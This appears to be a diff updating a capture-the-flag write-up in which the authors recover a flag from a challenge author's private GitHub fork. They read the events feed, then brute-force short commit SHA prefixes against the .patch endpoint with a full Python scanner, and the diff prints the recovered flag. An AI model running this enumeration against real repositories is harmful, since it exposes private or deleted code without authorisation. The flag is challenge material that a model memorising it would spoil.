@@ -13,30 +13,130 @@ Just as in the previous challenge, any attempt to search for the flag in the com
 
 ## Footprint
 
-This time, the key clue came from a leak in the repository network metadata. There was a private fork of the repository made by the author of the challenge (`cobradev4/phantom2`). The conclusion that it was private came from a mismatch between the fork count shown in the GitHub UI and the forks that could be seen on the Github Events API.
+
+This time the clue came from a leak in the repository network metadata. The main signal was a mismatch between the fork count shown in the GitHub UI, the list of forks visible on the public forks page / network-members page, and the repository events feed.
+
+First we checked the public repository page and noted the fork counter. Then we enumerated the public forks from the forks page / network members page. Finally, we inspected the repository events feed for `ForkEvent` and `PushEvent` entries.
+
+These were the commands we used to check these surfaces:
+
+```bash
+curl -fsSL https://api.github.com/repos/tamuctf/phantom2/events
+curl -fsSL https://api.github.com/repos/tamuctf/phantom2/forks?per_page=100
+```
+
+and we also checked the public forks listing at [https://github.com/tamuctf/phantom2/network/members](https://github.com/tamuctf/phantom2/network/members)
+
+The critical observation was that these sources did not agree.
+
+* the events feed referenced a private fork at `cobradev4/phantom2`
+* that fork was associated with the challenge author's account
+* the same fork path did not appear as a normal public fork in the public forks listing
+* a push event for that fork appeared shortly after the fork was created
+
+That is exactly what made `cobradev4/phantom2` interesting. It was not just "another fork." It was the only fork path tied to the author account and the only one that fit the hidden-history model.
 
 ## Recovery
 
-At this point, the issue was not where the flag was, but how we could recover it from the private fork. The key insight was that the private fork was made by the author of the challenge, so we could assume that the flag was in that fork's commit history.
+This opens an interesting path, as in GitHub forks are implemented as references to the same underlying git objects, so in the end all forks share a same "space" where commits and other objects are stored. So this allows us to access to a private fork's commits if we can find the SHA of the commit containing the flag, even if that commit is not visible in the public repository.
 
 The working hypothesis was:
 
 * The author pushed a commit with the flag into their private fork.
 * GitHub still stored that object in the shared cross-fork repository storage, even if the commit was not visible in the public repository.
 
-If this was the case, there was a recovery path: if we knew the SHA prefix of the commit containing the flag, we could use the GitHub API to search for that commit patch and recover the flag.
+If this was the case, there was a recovery path: if we knew the SHA prefix of the commit containing the flag, we used the GitHub commit patch endpoint on the standard Github URL:
+
+```bash
+https://github.com/tamuctf/phantom2/commit/<prefix>.patch
+```
+
+This behaved as a prefix oracle: if the prefix matched a commit object in the repository, we got an `http:200` response with the patch. If it did not match, we got an `http:404` response. We also had to handle responses like `http 429` and `http:5XX` to prevent misclassifying possible matches as non-matches.
 
 ## Feasibility
 
-The feasibility of this attack relies on the fact that GitHub stores all objects in shared storage across forks, even private ones. This means that if we can find the SHA prefix of the commit containing the flag, we can recover it using the GitHub API.
+The feasibility of this attack relies on the fact that GitHub stores all objects in shared storage across forks, even private ones. This means that if we can find the SHA prefix of the commit containing the flag, we can recover it using the Github patch/diff endpoint.
 
 Then the question of whether this attack is feasible comes down to how easy it is to find the SHA prefix of the commit containing the flag.
 
-We can search prefixes of 4 hex characters, which means our search space is $16^4 = 65536$ possible prefixes. This is a feasible search space to brute-force using the GitHub API, as we can make a large number of requests in a reasonable amount of time.
+We can search prefixes of 4 hex characters, which means our search space is $16^4 = 65536$ possible prefixes. The important point is that we were not brute-forcing full commit hashes. We were enumerating a small short-prefix space against a route that GitHub was willing to resolve.
 
 ## Solution
 
-The solution we executed was to brute-force search for the commit containing the flag. We used the `search/commits` endpoint to search for commits in the repository and filtered results by SHA prefix.
+The solution we executed was to brute-force search for the commit containing the flag. We used the GitHub commit patch endpoint on the standard Github URL, the solver iterated over the possible 4-hex prefixes and checked the responses to identify which prefixes corresponded to existing commits in the repository.
+
+```python
+from __future__ import annotations
+
+import time
+from urllib import error, request
+
+REPO = "tamuctf/phantom2"
+PREFIX_LENGTH = 4
+DELAY = 0.05
+TIMEOUT = 15
+RETRIES = 5
+BACKOFF = 0.5
+
+RETRYABLE = {429, 500, 502, 503, 504}
+HEADERS = {
+    "User-Agent": "phantom2-scan",
+    "Accept": "text/plain, */*",
+}
+
+
+def probe(url: str) -> int:
+    attempt = 0
+    while True:
+        req = request.Request(url, headers=HEADERS)
+        try:
+            with request.urlopen(req, timeout=TIMEOUT) as resp:
+                return resp.getcode()
+        except error.HTTPError as exc:
+            if exc.code in RETRYABLE and attempt < RETRIES:
+                time.sleep(BACKOFF * (2**attempt))
+                attempt += 1
+                continue
+            return exc.code
+        except Exception as exc:  # noqa: BLE001
+            if attempt < RETRIES:
+                time.sleep(BACKOFF * (2**attempt))
+                attempt += 1
+                continue
+            print(f"error {url} {exc}", flush=True)
+            return 0
+
+
+def main() -> None:
+    total = 16**PREFIX_LENGTH
+    hits: list[str] = []
+
+    print(f"starting repo={REPO} total={total}", flush=True)
+
+    for index in range(total):
+        prefix = f"{index:0{PREFIX_LENGTH}x}"
+        url = f"https://github.com/{REPO}/commit/{prefix}.patch"
+        status = probe(url)
+
+        if status == 200:
+            hits.append(prefix)
+            print(f"hit {prefix}", flush=True)
+
+        if (index + 1) % 100 == 0:
+            print(f"progress {index + 1}/{total} hits={len(hits)}", flush=True)
+
+        time.sleep(DELAY)
+
+    print("done", flush=True)
+    print("hits:", " ".join(hits), flush=True)
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+> Note: The use of `urllib` instead of `requests` was a deliberate choice as the solver only had to handle simple `HTTP GET` requests without any meaningful header/cookie management and the only responses of interest was the status code, which made `urllib` a lightweight and sufficient choice for this task.
 
 After iterating through the possible prefixes, we found the following commits:
 
@@ -74,7 +174,7 @@ index 4345918..699ec43 100644
 ```
 And with that, we were able to recover the flag: `gigem{57up1d_917hu8_3v3n7_4p1_a8f943}`.
 
-> Note: the leetspeak in the flag: stupid_github_event_api. This likely indicates that the author's intended solution was likely to pull the exact SHA hash directly from a leaked PushEvent. However, exploiting the CFOR vulnerability via the brute-force script proved to be a highly effective, unintended path to victory.
+> The flag text strongly suggests that the author intended solvers to notice the GitHub events leak and recover the hidden fork activity from there. In our solve, the events leak gave us the model, but the actual object recovery came from the short-prefix `.patch` oracle.
 
 ## Conclusion
 
